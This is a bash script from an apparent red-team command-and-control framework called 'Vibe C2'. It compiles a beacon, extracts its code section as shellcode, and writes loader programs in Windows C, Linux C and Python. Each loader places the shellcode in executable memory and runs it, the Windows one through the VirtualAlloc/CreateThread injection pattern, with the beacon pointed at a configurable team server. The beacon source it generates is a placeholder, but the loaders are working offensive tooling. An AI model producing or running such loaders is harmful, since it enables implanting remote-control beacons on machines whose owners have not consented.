#!/bin/bash
# Vibe C2 - Specialized Shellcode Generator
# This script generates a minimal beacon and extracts its shellcode

set -e
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
PROJECT_ROOT="$(realpath $SCRIPT_DIR/../..)"
OUTPUT_DIR="$PROJECT_ROOT/target/shellcode"

GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Default values
SERVER_URL="http://localhost:8080"
FORMAT="raw"  # raw, c, python
OUTPUT_FILE=""

print_banner() {
    echo -e "${CYAN}"
    echo "🌊  V I B E  C 2  F R A M E W O R K  🌊"
    echo "       Shellcode Generator Tool"
    echo -e "${NC}"
}

print_help() {
    echo -e "${BLUE}Usage:${NC}"
    echo -e "  $0 [OPTIONS]"
    echo
    echo -e "${BLUE}Options:${NC}"
    echo -e "  ${YELLOW}--server-url URL${NC}       Team server URL (default: http://localhost:8080)"
    echo -e "  ${YELLOW}--format FORMAT${NC}        Output format: raw, c, c-win, python (default: raw)"
    echo -e "  ${YELLOW}--output FILE${NC}         Output file path (default: auto-generated)"
    echo -e "  ${YELLOW}--help${NC}                Show this help message"
    echo
}

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        --server-url)
            SERVER_URL="$2"
            shift 2
            ;;
        --format)
            FORMAT="$2"
            shift 2
            ;;
        --output)
            OUTPUT_FILE="$2"
            shift 2
            ;;
        --help)
            print_banner
            print_help
            exit 0
            ;;
        *)
            echo -e "${RED}[!]${NC} Unknown option: $1"
            print_help
            exit 1
            ;;
    esac
done

# Create output directory if it doesn't exist
mkdir -p "$OUTPUT_DIR"

# Set default output file if not specified
if [ -z "$OUTPUT_FILE" ]; then
    case "$FORMAT" in
        raw)
            OUTPUT_FILE="$OUTPUT_DIR/vibe_beacon_shellcode.bin"
            ;;
        c)
            OUTPUT_FILE="$OUTPUT_DIR/vibe_beacon_shellcode.c"
            ;;
        c-win)
            OUTPUT_FILE="$OUTPUT_DIR/vibe_beacon_shellcode_win.c"
            ;;
        python)
            OUTPUT_FILE="$OUTPUT_DIR/vibe_beacon_shellcode.py"
            ;;
        *)
            echo -e "${RED}[!]${NC} Invalid format: $FORMAT"
            exit 1
            ;;
    esac
fi

# Build a minimal static beacon
build_minimal_beacon() {
    echo -e "${BLUE}[*]${NC} Building minimal static beacon..."
    
    # Create a special build config for minimal size
    TEMP_CONFIG="$PROJECT_ROOT/tools/build/minimal_beacon.rs"
    
    # This is just for demonstration - in a real scenario, we'd create a more minimal beacon
    cat > "$TEMP_CONFIG" << EOF
// Minimal Vibe C2 Beacon
// For shellcode extraction only

fn main() {
    println!("Vibe C2 Minimal Beacon");
    println!("Server URL: $SERVER_URL");
    
    // Add minimal beacon functionality here
    // This would be calling into the beacon library with minimal features
}
EOF
    
    # Build with size optimizations using the standard target (no MUSL)
    cd "$PROJECT_ROOT"
    echo -e "${YELLOW}[!]${NC} Building with standard target instead of MUSL due to dependency issues"
    RUSTFLAGS="-C opt-level=z -C panic=abort" \
    cargo build --release
    
    echo -e "${GREEN}[+]${NC} Minimal beacon built successfully."
}

# Extract shellcode from the binary
extract_shellcode() {
    echo -e "${BLUE}[*]${NC} Extracting shellcode..."
    
    BINARY_PATH="$PROJECT_ROOT/target/release/vibe-beacon"
    
    # Check if the binary exists
    if [ ! -f "$BINARY_PATH" ]; then
        echo -e "${RED}[!]${NC} Binary not found at $BINARY_PATH"
        exit 1
    fi
    
    # Extract the .text section (code) from the binary
    echo -e "${BLUE}[*]${NC} Extracting .text section with objcopy..."
    objcopy -O binary -j .text "$BINARY_PATH" "$OUTPUT_DIR/raw_shellcode.bin"
    
    # Process according to requested format
    case "$FORMAT" in
        raw)
            cp "$OUTPUT_DIR/raw_shellcode.bin" "$OUTPUT_FILE"
            ;;
        c-win)
            # Generate cross-platform C file with the shellcode for Windows
            echo -e "${BLUE}[*]${NC} Generating cross-platform Windows shellcode wrapper..."
            
            # Get the size of the shellcode file
            SHELLCODE_SIZE=$(stat -c %s "$OUTPUT_DIR/raw_shellcode.bin")
            
            # Read the binary file and convert to hex array manually
            echo -e "${BLUE}[*]${NC} Creating shellcode array..."
            SHELLCODE_ARRAY="unsigned char shellcode[] = {"
            
            # Use hexdump to create the byte array if available
            if command -v hexdump &> /dev/null; then
                # Use hexdump to get hex values and format as a C array
                BYTES=$(hexdump -v -e '"\\x" 1/1 "%02x" " "' "$OUTPUT_DIR/raw_shellcode.bin")
                for BYTE in $BYTES; do
                    SHELLCODE_ARRAY+="$BYTE, "
                done
            else
                # Fallback to od if hexdump is not available
                BYTES=$(od -An -tx1 -v "$OUTPUT_DIR/raw_shellcode.bin" | tr -d '\n' | sed 's/[[:space:]]/ /g')
                for BYTE in $BYTES; do
                    SHELLCODE_ARRAY+="0x$BYTE, "
                done
            fi
            
            # Remove the last comma and space, then close the array
            SHELLCODE_ARRAY=${SHELLCODE_ARRAY%, }
            SHELLCODE_ARRAY+="};"
            
            cat > "$OUTPUT_FILE" << EOF
// Vibe C2 Beacon Shellcode (Cross-platform, for Windows)
// Auto-generated by Vibe C2 Framework
// Target server: $SERVER_URL

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Windows-specific definitions that allow compilation on Linux
#ifdef _WIN32
    #include <windows.h>
#else
    // Define Windows types for cross-compilation
    #define DWORD unsigned long
    #define LPVOID void*
    #define HANDLE void*
    #define BOOL int
    #define TRUE 1
    #define FALSE 0
    #define LPDWORD unsigned long*
    #define NULL 0
    
    // Memory protection constants
    #define MEM_COMMIT 0x1000
    #define MEM_RESERVE 0x2000
    #define PAGE_EXECUTE_READWRITE 0x40
    #define MEM_RELEASE 0x8000
    
    // Thread constants
    #define INFINITE 0xFFFFFFFF
    
    // Function prototypes matching Windows API
    typedef DWORD (*LPTHREAD_START_ROUTINE)(LPVOID lpParameter);
    LPVOID VirtualAlloc(LPVOID lpAddress, size_t dwSize, DWORD flAllocationType, DWORD flProtect);
    BOOL VirtualFree(LPVOID lpAddress, size_t dwSize, DWORD dwFreeType);
    HANDLE CreateThread(void* lpThreadAttributes, size_t dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
    DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
    BOOL CloseHandle(HANDLE hObject);
    
    // This is just for compilation on Linux - these won't be used when compiled on Windows
    // as the real Windows API functions will be used instead
    LPVOID VirtualAlloc(LPVOID lpAddress, size_t dwSize, DWORD flAllocationType, DWORD flProtect) {
        fprintf(stderr, "[ERROR] This is a Windows-only program. Please compile with MinGW or on Windows.\n");
        exit(1);
        return NULL;
    }
    
    BOOL VirtualFree(LPVOID lpAddress, size_t dwSize, DWORD dwFreeType) { return FALSE; }
    HANDLE CreateThread(void* lpThreadAttributes, size_t dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) { return NULL; }
    DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) { return 0; }
    BOOL CloseHandle(HANDLE hObject) { return FALSE; }
#endif

// Shellcode extracted from beacon
$SHELLCODE_ARRAY
unsigned int shellcode_len = $SHELLCODE_SIZE;

int main(int argc, char *argv[]) {
    printf("Vibe C2 Beacon Shellcode Loader (Windows)\n");
    printf("Target server: $SERVER_URL\n\n");
    
#ifndef _WIN32
    printf("[ERROR] This program is designed for Windows only.\n");
    printf("Compile with MinGW: x86_64-w64-mingw32-gcc -o vibe_beacon.exe vibe_beacon_shellcode_win.c\n");
    return 1;
#endif
    
    // Allocate memory for the shellcode with Windows VirtualAlloc
    void *mem = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        printf("Error: Could not allocate memory\n");
        return 1;
    }
    
    // Copy shellcode to allocated memory
    memcpy(mem, shellcode, shellcode_len);
    
    printf("Executing beacon shellcode...\n");
    
    // Create a thread to run the shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (hThread != NULL) {
        // Wait for shellcode execution to finish
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    } else {
        printf("Error: Could not create thread\n");
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }
    
    return 0;
}
EOF
            ;;
        c)
            # Generate C file with the shellcode
            echo -e "${BLUE}[*]${NC} Generating C wrapper..."
            
            # Get the size of the shellcode file
            SHELLCODE_SIZE=$(stat -c %s "$OUTPUT_DIR/raw_shellcode.bin")
            
            cat > "$OUTPUT_FILE" << EOF
// Vibe C2 Beacon Shellcode
// Auto-generated by Vibe C2 Framework
// Target server: $SERVER_URL

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>

// Shellcode will be loaded from file at runtime
#define SHELLCODE_SIZE $SHELLCODE_SIZE

int main(int argc, char *argv[]) {
    printf("🌊 Vibe C2 Beacon Shellcode Loader 🌊\\n");
    
    // Load shellcode from file
    printf("Loading shellcode from file...\\n");
    const char* shellcode_file = "$OUTPUT_DIR/raw_shellcode.bin";
    int fd = open(shellcode_file, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    
    // Allocate memory for shellcode
    void *mem = mmap(0, SHELLCODE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }
    
    // Read shellcode into memory
    ssize_t bytes_read = read(fd, mem, SHELLCODE_SIZE);
    close(fd);
    
    if (bytes_read != SHELLCODE_SIZE) {
        fprintf(stderr, "Failed to read entire shellcode file\\n");
        munmap(mem, SHELLCODE_SIZE);
        return 1;
    }
    
    printf("Loaded %zd bytes of shellcode, executing...\\n", bytes_read);
    int (*beacon)() = (int(*)())mem;
    return beacon();
}
EOF
            ;;
        python)
            # Generate Python file with the shellcode
            echo -e "${BLUE}[*]${NC} Generating Python wrapper..."
            # Get the size of the shellcode file
            SHELLCODE_SIZE=$(stat -c %s "$OUTPUT_DIR/raw_shellcode.bin")
            
            cat > "$OUTPUT_FILE" << EOF
#!/usr/bin/env python3
# Vibe C2 Beacon Shellcode
# Auto-generated by Vibe C2 Framework
# Target server: $SERVER_URL

import ctypes
import mmap
import os
import sys

def main():
    print("🌊 Vibe C2 Beacon Shellcode Loader 🌊")
    
    # Load shellcode from file
    shellcode_file = "$OUTPUT_DIR/raw_shellcode.bin"
    print(f"Loading shellcode from {shellcode_file}...")
    
    try:
        with open(shellcode_file, 'rb') as f:
            shellcode = f.read()
    except Exception as e:
        print(f"Error loading shellcode: {e}")
        return 1
    
    # Allocate memory for the shellcode
    size = len(shellcode)
    print(f"Loaded {size} bytes of shellcode")
    
    # Create memory map with execute permissions
    mem = mmap.mmap(-1, size, mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    
    # Copy shellcode to the buffer
    mem.write(shellcode)
    mem.seek(0)
    
    # Cast the buffer to a function pointer and execute
    print("Executing beacon shellcode...")
    func_ptr = ctypes.c_void_p.from_buffer(mem)
    shellcode_func = ctypes.CFUNCTYPE(ctypes.c_int)(func_ptr.value)
    
    # Execute the shellcode
    return shellcode_func()

if __name__ == "__main__":
    sys.exit(main())
EOF
            chmod +x "$OUTPUT_FILE"
            ;;
    esac
    
    # Get file size for reporting
    SIZE=$(du -h "$OUTPUT_FILE" | cut -f1)
    echo -e "${GREEN}[+]${NC} Shellcode extracted successfully (${SIZE})."
    echo -e "${GREEN}[+]${NC} Output: $OUTPUT_FILE"
}

# Main execution
print_banner
build_minimal_beacon
extract_shellcode

echo -e "${CYAN}"
echo "🌊  V I B E  C 2  F R A M E W O R K  🌊"
echo "    Shellcode Generation Complete!"
echo -e "${NC}"
